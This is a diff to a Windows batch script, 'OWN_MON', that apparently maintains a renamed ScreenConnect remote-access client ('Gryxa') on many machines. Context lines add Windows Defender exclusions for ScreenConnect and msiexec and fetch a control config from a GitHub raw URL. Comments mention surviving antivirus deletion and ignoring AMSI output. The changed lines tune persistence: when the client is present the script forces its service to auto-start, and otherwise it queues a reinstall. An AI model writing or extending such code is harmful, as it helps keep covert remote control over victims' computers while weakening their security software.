@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M58
+rem  OWN_MON  BUILD 20260804M59
+rem  M59: stop drop+reinstall — clear force SKIP if healthy; HEAL/Ensure 1060-only; G9 never /x on HEAL.
 rem  M58: sticky version_floor.cfg — once updated, never apply/run older mon/lib/gryxa again.
 rem  M57: fleet_channel.cfg pin+floor; cmd-first Gryxa health (ignore AMSI garbage); no downgrade.
 rem  M52: auto-heal stuck Gryxa (1060+dir / RUNNING no gryxa.com ImagePath) via F8/G7; restore lib if AV ate it.
@@ -61,8 +62,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "Scre
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M58"
-set "MON_MIN=M56"
+set "MONVER=M59"
+set "MON_MIN=M58"
 set "GIT_PIN="
 set "CHANNEL_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/fleet_channel.cfg?t=%RANDOM%%RANDOM%"
 set "FLOOR_FILE=%WD%\version_floor.cfg"
@@ -634,10 +635,21 @@ if "!GRYXA_OK!"=="0" if exist "%WD%\own_lib.ps1" (
 )
 echo gryxa_health=!GH!>>"%LOG%"
 
-rem FORCE push: queue Gryxa REINSTALL (panel wipe) then ack — freeze still blocks daily msiexec
+rem FORCE push: never /x a live Guest — ack if already healthy; REINSTALL only when absent
 if "%FORCE_G%"=="1" (
-  echo gryxa_force_push_reinstall>>"%LOG%"
-  call :QueueGryxaHeal REINSTALL
+  if "!GRYXA_OK!"=="1" (
+    echo gryxa_force_skip_already_healthy>>"%LOG%"
+  ) else (
+    sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+    if not errorlevel 1 (
+      echo gryxa_force_skip_svc_exists_start_only>>"%LOG%"
+      sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
+      sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+    ) else (
+      echo gryxa_force_push_reinstall_1060_only>>"%LOG%"
+      call :QueueGryxaHeal REINSTALL
+    )
+  )
   if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
   goto :GryxaAfter
 )
@@ -944,7 +956,7 @@ echo gryxa_heal_queued mode=%HEALMODE%>>"%LOG%"
 exit /b 0
 
 :EnsureGryxaMust
-rem M52: start-only; stuck → QueueGryxaHeal (never bare sc create)
+rem M59: start-only when svc exists; queue HEAL only on hard 1060 (G9 HEAL never /x)
 set "GRYXA_OK=0"
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
 set "GSVC=ScreenConnect Client (%GRYXA_FP%)"
@@ -969,9 +981,12 @@ if not errorlevel 1 (
     reg query "HKLM\SYSTEM\CurrentControlSet\Services\%GSVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
     if not errorlevel 1 set "GRYXA_OK=1"
   )
+  if "%GRYXA_OK%"=="0" echo gryxa_must_svc_exists_no_heal>>"%LOG%"
+  if "%GRYXA_OK%"=="1" (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down_no_x>>"%LOG%")
+  exit /b 0
 )
-if "%GRYXA_OK%"=="0" call :QueueGryxaHeal HEAL
-if "%GRYXA_OK%"=="1" (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_heal_queued>>"%LOG%")
+echo gryxa_must_1060_queue_heal>>"%LOG%"
+call :QueueGryxaHeal HEAL
 exit /b 0
 
 :TgGryxa
